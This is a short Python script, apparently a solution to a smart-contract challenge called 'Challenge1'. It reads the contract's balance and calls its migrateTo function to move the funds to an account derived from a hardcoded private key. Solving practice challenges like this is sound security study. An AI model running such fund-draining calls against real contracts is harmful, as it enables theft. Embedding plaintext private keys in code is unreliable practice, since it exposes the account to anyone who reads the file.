from brownie import Challenge1
from web3 import Web3

contract = Challenge1.at('0x14DfF8A248E1987E352104CE9e93E84DdC93f566')
balance = contract.getBalance()
print(balance)

private_key = '6bc230e9fc4970b2773fe22baa1fde366deebc390146eaffca76a4f0c8428b72'
account = web3.eth.account.privateKeyToAccount(private_key)
tx = contract.migrateTo(account.address, {'from': contract.me(), 'nonce': 422, 'gasPrice': web3.eth.gas_price, 'gas': 200000, 'allow_revert': True})